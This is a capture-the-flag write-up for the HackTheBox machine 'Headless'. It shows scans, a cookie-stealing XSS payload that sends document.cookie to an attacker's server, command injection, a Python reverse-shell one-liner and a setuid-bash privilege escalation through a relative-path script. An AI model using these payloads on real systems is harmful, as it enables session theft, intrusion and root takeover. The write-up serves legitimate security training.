## Writeup for "Headless" from HackTheBox


First a nmap scan was performed on the target machine to see which ports are available.


The command `nmap -sC -sV <Target_IP>` was used, which produced this output:


```bash
Nmap scan report for 10.10.11.8
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sat, 13 Apr 2024 06:00:26 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=4/13%Time=661A1F7A%P=aarch64-unknown-linux
SF:-gnu%r(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\
SF:.2\.2\x20Python/3\.11\.2\r\nDate:\x20Sat,\x2013\x20Apr\x202024\x2006:00
SF::26\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-L
SF:ength:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPD
SF:WnvB_Zfs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n
SF:<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8
SF:\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=devi
SF:ce-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Con
SF:struction</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-fa
SF:mily:\x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20display:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:justify-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(
SF:0,\x200,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!
SF:DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</hea
SF:d>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x
SF:20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x204
SF:00</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x
SF:20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x
SF:20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n
SF:");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.16 seconds
```


After the nmap scan a UDP port 5000 was revealed. Nmap output suggests that it is running a http server.


Upon entering the site, a count down seems to be occurring. There is a button "For questions". Upon clicking the button, the user is taken to a the "/support" page which contains a form for users to submit messages to the server.


Before testing the form, dirsearch was run to check if there were any other directories in the website. The output of the command `python3 dirsearch.py -u http://<IP>:5000/` is as follows:


```
  _|. _ _  _  _  _ _|_  v0.4.3                                              
 (_||| _) (/_(_|| (_| )                                                      
                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11722

Output: /home/kali/dirsearch/reports/http_10.10.11.8_5000/__24-04-13_02-06-29.txt

Target: http://10.10.11.8:5000/

[02:06:29] Starting:                                                          
[02:08:52] 401 -  317B  - /dashboard                                        
[02:11:02] 200 -    2KB - /support                                          
                                                                             
Task Completed
```


The only other directory found was "/dashboard". Upon visiting dashboard it seems the user must somehow authenticate themselves before proceeding.


Returning to the "/support" page, several attacks were attempted, such as SQL injections, command injections and SSTIs, by submitting payloads on various fields in the form. When these malicious payloads were attempted, the server will send a new page to the client informing them that a hacking attempt was found. The headers of the request that the user sent were also displayed.


This is possibly open to vulnerabilities as a malicious payload can be placed in one of the headers and sent to the server, which could be executed if the input in the headers are not properly sanitised. Upon looking at the request, it can be seen that the server sent a cookie to the user. By inspecting the webpage and providing a malicious payload in the cookie's is_admin field, before submitting a malicious payload in the message field of the form, the payload can be executed. Eventually the below payload was provided to the is_admin cookie (the XSS payload was found on https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e):


```javascript
<script>var i=new Image(); i.src="http://10.10.14.11:8000/?cookie="+document.cookie;</script>
```


The above is a Cross Site Scripting payload. A HTML element was provided which contains Javascript code that will be executed by the web server if not properly sanitised. When executed, the payload will create a new image and give the image a source, which will be `"http://10.10.14.11:8000/?cookie="+document.cookie;`. This will cause the webserver to visit the attacker's webserver and will include the server's cookie in the url parameters.


Before sending the payload, a python webserver was started on the attacking machine using the command `python3 -m http.server 8000`.


When the request was sent, the python webserver captured a request:


```
10.10.11.8 - - [13/Apr/2024 03:21:38] "GET /?cookie=is_admin;%20is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -
```


This means that the server's cookie can be accessed. By accessing a cookie, this can be used to impersonate a user of higher previlege, allowing unintended access to sensitive pages. By using the cookie to access the "/dashboard" page, this gives the user access to the webpage. This webpage allows a user to generate a website health report and allows the user to enter a date. This input box was then tested for OS command injection by running the command `sleep 5`. If the server is vulnerable to OS command injection, when submitting this payload, the server will take at least 5 seconds to load before returning a response.


Upon submitting the request, the server did take at least 5 seconds to respond, suggesting that it is vulnerable to OS command injection. To exploit this vulnerability, a bash reverse shell payload would be provided to the input which will send a reverse shell to the attacking machine. A listener can be started using `nc -lnvp 1234` to listen for a reverse shell on port 1234. Then a bash payload was provided as input and sent to the server:


```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Upon sending the above payload, a reverse shell was received as the user dvir. Upon upgrading the shell using `python3 -c "import pty; pty.spawn('/bin/bash')"`, the next step taken to exploit the box was to run `sudo -l` to see if the user was allowed to run any commands as the superuser.


```bash
bash-5.2$ sudo -l
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```


The user is allowed to run /usr/bin/syscheck as the super user. Upon running the command, this output was provided:


```bash
bash-5.2$ sudo /usr/bin/syscheck
sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.7G
System load average:  0.04, 0.03, 0.06
Database service is not running. Starting it...
```


The command seems to provide information about the operating system and says that it is starting a database service. To explore what the command does, the contents of the script are outputted by running `cat /usr/bin/syscheck`. 


```bash
bash-5.2$ cat /usr/bin/syscheck
cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```


The above contents how that the script "initdb.sh" is being run from the current directory of wherever the script is being run. This can be exploited by creating a initdb.sh script in the attacker's current directory and executing syscheck again. The contents of initdb.sh is as follows:

```bash
chmod u+s /bin/bash
```

The script will set a setuid permission bit for the owner of /bin/bash, in this case, root. Hence, this allows lower previliged users to run /bin/bash as the root user. Hence, this will allow the users to start a bash as the root user.


Upon running syscheck again, the command `/bin/bash -p` is run, creating a new bash instance as a root user. Upon doing so, the user immediately becomes the superuser.


Overall, the box tested the user's ability to identify a XSS vulnerability and to inject that vulnerability onto the webserver. I found the process of crafting an XSS payload to steal the server's cookies to be quite educational. Doing so was the most challenging part of the box, as after obtaining the credentials of a higher previleged user, the methods used to exploit the rest of the box were straightforward.